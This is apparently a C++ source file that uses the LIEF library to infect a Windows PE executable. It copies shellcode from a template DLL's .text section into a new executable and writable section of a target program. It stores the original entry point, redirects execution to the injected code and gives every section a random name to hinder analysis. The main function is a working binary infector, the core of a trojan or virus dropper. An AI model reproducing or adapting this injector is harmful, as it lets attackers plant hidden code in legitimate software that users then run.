#include "stdafx.h"

using namespace LIEF::PE;

void
debugPrintInfo(
	const std::unique_ptr<Binary>& fileObj
)
{
	std::cout << "== Dos Header ==" << '\n';
	std::cout << fileObj->dos_header() << '\n';

	std::cout << "== Header ==" << '\n';
	std::cout << fileObj->header() << '\n';

	std::cout << "== Optional Header ==" << '\n';
	std::cout << fileObj->optional_header() << '\n';

	if (fileObj->has_rich_header()) {
		std::cout << "== Rich Header ==" << '\n';
		std::cout << fileObj->rich_header() << '\n';
	}

	std::cout << "== Data Directories ==" << '\n';
	for (const DataDirectory& directory : fileObj->data_directories()) {
		std::cout << directory << '\n';
	}

	std::cout << "== Sections ==" << '\n';
	for (const Section& section : fileObj->sections()) {
		std::cout << section << '\n';
	}

	if (fileObj->imports().size() > 0) {
		std::cout << "== Imports ==" << '\n';
		for (const Import& import : fileObj->imports()) {
			std::cout << import << '\n';
		}
	}

	if (fileObj->relocations().size() > 0) {
		std::cout << "== Relocations ==" << '\n';
		for (const Relocation& relocation : fileObj->relocations()) {
			std::cout << relocation << '\n';
		}
	}

	if (fileObj->has_tls()) {
		std::cout << "== TLS ==" << '\n';
		std::cout << fileObj->tls() << '\n';
	}

	if (fileObj->has_exports()) {
		std::cout << "== Exports ==" << '\n';
		std::cout << fileObj->get_export() << '\n';
	}

	if (!fileObj->symbols().empty()) {
		std::cout << "== Symbols ==" << '\n';
		for (const Symbol& symbol : fileObj->symbols()) {
			std::cout << symbol << '\n';
		}
	}

	if (fileObj->has_debug()) {
		std::cout << "== Debug ==" << '\n';
		for (const Debug& debug : fileObj->debug()) {
			std::cout << debug << '\n';
		}
	}

	if (auto manager = fileObj->resources_manager()) {
		std::cout << "== Resources ==" << '\n';
		std::cout << *manager << '\n';
	}

	for (const Signature& sig : fileObj->signatures()) {
		std::cout << "== Signature ==" << '\n';
		std::cout << sig << '\n';
	}
}

std::string
GenerateRandomString(
	size_t count
)
{
	const std::string in = R"(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !"#$%&'()*+,-./:;<=>?@)";
	std::string out;
	out.clear();
	out.push_back('.');
	std::sample(in.cbegin(), in.cend(), std::back_inserter(out),
		count, std::mt19937{ std::random_device{}() });

	return out;
}

int
main(
	uint16_t argc,
	char** argv
)
{
	spdlog::set_level(spdlog::level::debug);

	auto shellcodeObj = Parser::parse(R"(F:\CodeSpace\Tajimari\Build\ShellcodeTemplate\Debug\x64\ShellcodeTemplate.dll)");
	auto targetObj = Parser::parse(R"(E:\dllexp-x64\dllexp.exe)");
	auto oldEntryPoint = targetObj->entrypoint();
	auto secInfected = shellcodeObj->get_section(".text");
	uint32_t codeOffset = 0;
	uint32_t entryOffset = 0;
	uint32_t newEntryPoint = 0;
	Section newSection;
	LIEF::span<const uint8_t> tempData;
	std::vector<uint8_t> data;
	auto imageBase = targetObj->imagebase();

	if (secInfected == nullptr) {
		spdlog::error("Shellcode template file not correct!");
		return 0;
	}

	spdlog::info("Originally entry point: {:#x}", oldEntryPoint - imageBase);

	for (auto& func : shellcodeObj->get_export().entries()) {
		if (func.name() == "main") {
			codeOffset = func.function_rva() - secInfected->virtual_address();
			spdlog::info("Infected func: {:#x}, offset of text: {:#x}", func.function_rva(), codeOffset);
		}

		if (func.name() == "OriginalEntryPoint") {
			entryOffset = func.function_rva() - secInfected->virtual_address();
			spdlog::info("OriginalEntryPoint variable: {:#x}, offset of text: {:#x}", func.function_rva(), codeOffset);
		}
	}

	tempData = secInfected->content();
	std::copy(tempData.begin(), tempData.end(), std::back_inserter(data));
	*(uint64_t*)(data.data() + entryOffset) = oldEntryPoint;
	newSection.content(data);
	newSection.add_characteristic(
		SECTION_CHARACTERISTICS::IMAGE_SCN_MEM_EXECUTE |
		SECTION_CHARACTERISTICS::IMAGE_SCN_MEM_READ |
		SECTION_CHARACTERISTICS::IMAGE_SCN_MEM_WRITE
	);

	for (auto& sec : targetObj->sections()) {
		sec.name(GenerateRandomString(4));
	}

	newSection.name(GenerateRandomString(4));

	auto secAdded = targetObj->add_section(newSection);
	newEntryPoint = secAdded->virtual_address() + codeOffset;
	targetObj->optional_header().addressof_entrypoint(newEntryPoint);

	spdlog::info("New entry point: {:#x}", newEntryPoint);

	Builder builder = *targetObj;
	builder.build();
	builder.write(R"(F:\CodeSpace\Tajimari\Build\Tajimari\Debug\x64\Modified.exe)");

	return 0;
}
